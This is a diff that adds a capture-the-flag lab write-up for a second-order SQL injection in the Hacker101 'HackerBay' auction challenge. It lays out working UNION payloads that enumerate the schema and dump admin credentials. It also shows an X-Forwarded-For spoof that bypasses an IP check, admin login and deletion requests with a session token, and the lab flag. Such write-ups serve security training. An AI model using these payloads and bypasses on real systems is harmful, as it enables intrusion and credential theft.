@@ -1,0 +1,89 @@
+================================
+LAB: HackerBay - Grayhatcon CTF (Flag 2 - Second-Order SQLi)
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-03-04
+Lab URL: https://72226769c461d3390f3fa37932150032.ctf.hacker101.com
+Category: Web - SQL Injection
+Level: Moderate
+Objective: Delete auction listing 8 owned by user hunter2
+Description: HackerBay auction platform. Exploit a second-order SQLi to dump admin credentials, access the admin panel, and delete a malicious auction listing.
+
+[RECONNAISSANCE]
+----------------
+- Endpoint: GET /dashboard/auctions/questions?id=
+- Normal response: {"name":"Laptop","questions":[...],"auctions":[]}
+- 3 JSON fields = 3 SQL columns (name, questions, auctions)
+- Testing id=1 -> auctions populated with real auction data
+- Testing id=42 -> auctions empty
+- Observation: column 1 is reused as ID in a second dynamic query to populate auctions[]
+- Table auctions has exactly 9 columns (confirmed by incrementing UNION column count)
+- col1 -> "id" in auctions JSON, col6 -> "title" in auctions JSON
+- Admin panel at /s3cr3t-4dm1n/ requires X-Forwarded-For: 8.8.8.8 to bypass IP restriction
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Second-order SQLi: column 1 of the first UNION result is fed back unsanitized into a second SQL query:
+  SELECT id,title,... FROM auctions WHERE auction_type_id = <column1>
+
+If column1 contains a SQL UNION string, the backend executes it as a real query.
+
+Proof of concept:
+  GET /dashboard/auctions/questions?id=0 UNION SELECT '0 union select 1,2,3,4,5,6,7,8,9',10,'[]'--
+  Response: "auctions":[{"id":"1","title":"6"}]
+  -> column1 string executed as SQL, returning col1 and col6 of injected UNION
+
+Table enumeration via second-order injection:
+  column1 = '0 union select table_name,2,3,4,5,6,7,8,9 from information_schema.tables'
+  -> tables found: admin, auction
+
+Column enumeration (table admin):
+  column1 = '0 union select COLUMN_NAME,2,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name="admin"'
+  -> columns: id, username, password
+
+[EXPLOITATION]
+--------------
+1. Dump admin credentials via second-order SQLi:
+   GET /dashboard/auctions/questions?id=0 UNION SELECT '0 union select username,2,3,4,5,password,7,8,9 from admin',10,'[]'--
+   -> {"id":"h4ckerbayadmin","title":"auction$rFun!"}
+
+2. Login to admin panel:
+   POST /s3cr3t-4dm1n/
+   X-Forwarded-For: 8.8.8.8
+   username=h4ckerbayadmin&password=auction%24rFun!
+   -> Set-Cookie: admin-token=DF120B994C5FD4377A42F55D086F6EF7
+
+3. Access admin panel to get auction hash:
+   GET /s3cr3t-4dm1n/
+   Cookie: admin-token=DF120B994C5FD4377A42F55D086F6EF7
+   X-Forwarded-For: 8.8.8.8
+   -> Form displayed: "Enter an auction hash below to manage the listing"
+
+4. Lookup auction hash 8ylbbgs2 (obtained from /auction/8 source):
+   POST /s3cr3t-4dm1n/
+   Cookie: admin-token=DF120B994C5FD4377A42F55D086F6EF7
+   X-Forwarded-For: 8.8.8.8
+   auction_hash=8ylbbgs2
+   -> Auction confirmed: "HackerOne Username/Password List"
+   -> Hidden fields: auction_hash=8ylbbgs2, action=delete
+
+5. Delete auction:
+   POST /s3cr3t-4dm1n/
+   Cookie: admin-token=DF120B994C5FD4377A42F55D086F6EF7
+   X-Forwarded-For: 8.8.8.8
+   auction_hash=8ylbbgs2&action=delete
+   -> "Auction listing has been deleted" + Flag displayed
+
+[EVIDENCE]
+----------
+Flag: ^FLAG^7e91468c9616396b00800a9c8de7094396690e7ea460ea5a254199ec461e3cf0$FLAG$
+
+[LESSONS LEARNED]
+-----------------
+- Second-order SQLi: data stored in DB then reused unsanitized in a second query - harder to spot than classic SQLi
+- Key indicator: column value changes response behavior dynamically (id=1 vs id=42)
+- Always test how many columns a UNION needs before crafting nested payloads
+- X-Forwarded-For header can bypass IP-based access restrictions on admin panels
+- Admin panels behind obscure paths are still exploitable once credentials are dumped via SQLi
